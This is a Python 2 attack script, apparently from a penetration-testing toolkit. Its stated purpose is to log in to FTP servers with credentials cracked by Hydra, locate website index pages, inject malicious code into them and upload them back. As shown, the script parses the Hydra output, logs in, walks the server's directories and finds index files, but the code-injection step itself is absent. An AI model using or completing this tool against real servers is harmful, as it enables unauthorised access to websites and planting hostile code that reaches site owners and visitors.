#!/usr/bin/env python

import subprocess
import multiprocessing
from multiprocessing import *
import os
import sys
import re
import reconf
from reconf import *
import time
from functools import wraps
import argparse
import ipaddr
import nmapxml
from nmapxml import *
import ftputil
import ftplib

parser = argparse.ArgumentParser(description='Scan for FTP websites using creds discovered with hydra, search for index files append malicous code into it, then upload it back')
parser.add_argument('-ip', action='store', required=True, help='IP Address to be assessed')

args = parser.parse_args()
try:
        ip_address = ipaddr.IPAddress(args.ip)
except:
        print "Try again..."
        sys.exit()

ip_address = str(ip_address)

def ftpLogin(ip_address, u, p):
        try:
                ftp = ftputil.FTPHost(ip_address, u, p)
                print "[+] %s - FTP using %s/%s is Permitted" % (ip_address, u, p)
                return(ftp)
        except OSError:
                print "[-] %s - FTP using %s/%s is not allowed" % (ip_address, u, p)
                pass 

fnmap = "%s/%s_ftp_hydra.txt" % (reconf.rsltpth, ip_address)
try:
	fnmap = "%s/%s_ftp_hydra.txt" % (reconf.rsltpth, ip_address)
	print "\033[1;31m [!] \033[0;m Parsing %s for creds" % (fnmap)
	with open(fnmap, 'r') as searchfile:
		for line in searchfile:
			if 'login:' in line and 'password:' in line:
				u = re.split('\s+', line)[4].strip()
				p = re.split('\s+', line)[6].strip()
				ftp = ftpLogin(ip_address, u, p)
				recursive = ftp.walk("/",topdown=True,onerror=None)
				for root,dirs,files in recursive:
					for dlst in dirs:
						results = "%s\n" % dlst
						if dlst != "":
							#f.write(results)
							print results
					for fname in files:
						results = "%s/%s\n" % (root, fname)
						if fname != "":
							#f.write(results)
							print results
						if re.search(r'^(index)[.](htm|html|asp|php)', fname):
							print "[+] Found default page %s at %s" % (fname, root)
							try:
								print "Downloading %s with U %s P %s" % (fname, u, p)
								ftp.upload_if_newer(fname, ("%s/%s" % (root, fname)))
							except Exception, e:
								print e
except Exception, e: 
	pass
finally:
	print "\033[1;31m [!] \033[0;m Assessment Complete."
